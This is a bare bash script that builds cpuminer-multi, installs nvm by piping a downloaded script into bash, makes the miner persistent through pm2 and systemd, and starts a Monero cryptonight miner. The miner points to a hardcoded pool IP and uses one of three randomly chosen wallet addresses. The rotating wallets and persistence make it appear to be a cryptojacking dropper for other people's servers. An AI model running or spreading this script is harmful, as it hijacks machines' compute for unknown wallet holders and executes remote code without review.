#! /bin/bash
NGAUNHIEN=$((RANDOM%3+1))
CURUSER=$(whoami)
if [ "$NGAUNHIEN" == "1" ]; then
URL="stratum+tcp://74.208.94.205:5555"
elif [ "$NGAUNHIEN" = "2" ]; then
URL="stratum+tcp://74.208.94.205:3333"
else 
URL="stratum+tcp://74.208.94.205:7777"
fi
NGAUNHIEN2=$((RANDOM%3+1))
if [ "$NGAUNHIEN2" == "1" ]; then
USERP="48aNp4g4R3LBW6h9BQrvAs7oApLi1DQfRd8edKAdcAD1UXg5rwUu4jCjXqrT3anyZ22j7DEE74GkbVcQFyH2nNiC3eNGwWC"
elif [ "$NGAUNHIEN2" = "2" ]; then
USERP="43wmPCdcAFUdfiDi7yuNeWipJ2D8dtm5e3xXmkuwjBoN7QCxBJFTMaGJU4jhjaK7wT7dSi1QRC695hdgTGFSLG4dPrPMnNm"
else 
USERP="45mAaQZm7MMct6qm6r4b2UZQpELzRKLRD7X7vMoJoAUGBvGtFJELuHDc5LzbWVxr48irRRPocGSffb5HKMNifxh62EASYGC"
fi
ID=$(hostname)
PASS="admin@p2s.vn"
sudo apt-get update -y
sudo apt-get upgrade -y
sudo apt-get install -y git automake build-essential autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev
git clone https://github.com/wolf9466/cpuminer-multi cpuminer
cd cpuminer
sudo ./autogen.sh
sudo CFLAGS="-march=native" ./configure
sudo make
sudo sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3))
cd ~
curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.33.0/install.sh | bash
source ~/.nvm/nvm.sh
nvm install v6.9.2
cd cpuminer
npm install -g pm2
sudo env PATH=$PATH:`pwd`/.nvm/versions/node/v6.9.2/bin `pwd`/.nvm/versions/node/v6.9.2/lib/node_modules/pm2/bin/pm2 startup systemd -u $CURUSER --hp `pwd`
sudo chown -R $CURUSER. ~/.pm2
SCORES=`grep -c ^processor /proc/cpuinfo`
pm2 start minerd -- -a cryptonight -o $URL -u $USERP -p x -t 14
